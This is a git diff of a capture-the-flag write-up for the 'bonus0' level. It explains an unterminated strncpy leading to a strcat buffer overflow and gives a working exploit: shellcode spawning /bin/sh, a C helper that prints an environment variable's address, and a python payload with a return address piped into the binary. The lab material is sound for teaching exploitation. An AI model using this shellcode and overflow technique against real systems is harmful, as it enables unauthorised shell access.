@@ -1,7 +1,24 @@
+in this level the program use strncpy to copy the 20 characters read from stdin to a buffer
+but that buffer has only length of 20 which does not leave enough space for null terminator
+which lead to make the call of strcpy also copy aother buffer to be copied
+
+and then strcat is called on the buffer and the other one which leads to an overflow
+we can then make the program run a shellcode
+
+for shellcode see: http://shell-storm.org/shellcode/files/shellcode-827.php
 export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
-/tmp/a.out SHELLCODE
-python -c "print 'A'*4095 + '\n' + 'A'*9 + '\xa1\xf8\xff\xbf'+'A'*50" > /tmp/in
-at /tmp/in - | ./bonus0
+
+#include <stdio.h>
+int main(int argc, char *argv[]) {
+	printf("%p\n", getenv(argv[1]));
+	return 0;
+}
+
+~$ gcc -o levelx f.c
+~$ ./levelx SHELLCODE
+0xbffff8c6
+~$ python -c "print 'A'*4095 + '\n' + 'A'*9 + '\xc6\xf8\xff\xbf'+'A'*50" > /tmp/in
+~$ cat /tmp/in - | ./bonus0
  -
  -
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAA�� AAAAAAAAA����AAAAAAA��
